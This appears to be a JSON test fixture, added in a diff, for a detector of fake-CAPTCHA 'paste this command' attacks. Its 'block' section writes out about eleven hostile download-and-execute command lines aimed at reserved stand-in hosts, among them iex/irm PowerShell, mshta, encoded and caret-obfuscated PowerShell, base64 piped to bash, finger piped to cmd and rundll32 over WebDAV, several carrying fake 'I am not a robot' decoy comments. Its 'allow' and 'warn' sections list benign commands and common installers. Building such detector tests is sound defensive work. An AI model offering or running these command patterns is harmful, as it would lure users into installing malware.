@@ -1,0 +1,33 @@
+{
+  "note": "Shared test commands for the JavaScript engine and the PowerShell checker. Malicious samples only use reserved, non-routable hosts (example.invalid, *.example, 203.0.113.0/24).",
+  "block": {
+    "curl + silent msiexec (incident shape)": "cmd /c curl -s -o %TEMP%\\S775.msi https://cloubflare.example.top/5 && msiexec /i %TEMP%\\S775.msi /qn",
+    "powershell with fake reCAPTCHA comment": "powershell -w h -nop -c \"iex(irm https://203.0.113.7/a)\" # ✅ I am not a robot - reCAPTCHA Verification ID: 4821",
+    "mshta with fake Cloudflare comment": "mshta https://verify-check.example.top/captcha.hta # I am not a robot: Cloudflare Ray ID 8812",
+    "caret-obfuscated encoded powershell": "c^m^d /c p^o^w^e^r^s^h^e^l^l -w 1 -enc SQBFAFgAIAAoAGkAcgBtACAAaAB0AHQAcABzADoALwAvAGUAeABhAG0AcABsAGUA",
+    "FileFix disguised as a file path": "PowerShell -c \"iwr https://files.example.invalid/p.ps1 | iex\" # C:\\company\\internal-secure\\filedrive\\HRPolicy.docx",
+    "macOS base64 piped to bash": "echo \"Y3VybCAtcyBodHRwczovL2V2aWwuZXhhbXBsZS9zIHwgYmFzaA==\" | base64 -d | bash",
+    "finger fetch piped to cmd": "cmd /c start /min finger verify@203.0.113.9 | cmd",
+    "headless conhost": "conhost.exe --headless powershell -c \"irm https://203.0.113.5/s | iex\"",
+    "rundll32 over WebDAV share": "rundll32 \\\\203.0.113.5@SSL\\dav\\x.dll,Entry",
+    "string-split powershell download": "pow'+'ershell -w hidden -c \"iwr https://cdn.example.top/u -OutFile $env:TEMP\\u.exe; start $env:TEMP\\u.exe\"",
+    "space-padded decoy": "powershell -c \"irm https://example.invalid/x|iex\"                                                            ''Cloudflare human check''"
+  },
+  "allow": {
+    "npm install": "npm install react",
+    "git clone": "git clone https://github.com/user/repo.git",
+    "pip install": "pip install requests",
+    "winget": "winget install Microsoft.PowerToys",
+    "local powershell": "powershell Get-ChildItem",
+    "docker": "docker run -it ubuntu bash",
+    "code with url": "const res = await fetch(\"https://api.example.com/v1/items\");",
+    "sentence about captchas": "Please verify you are human by completing the CAPTCHA below.",
+    "plain url": "https://www.example.com/article?id=42",
+    "curl API example": "curl https://api.github.com/users/octocat"
+  },
+  "warn": {
+    "scoop installer": "irm https://get.scoop.sh | iex",
+    "bun installer": "curl -fsSL https://bun.sh/install | bash",
+    "rustup installer": "curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh"
+  }
+}
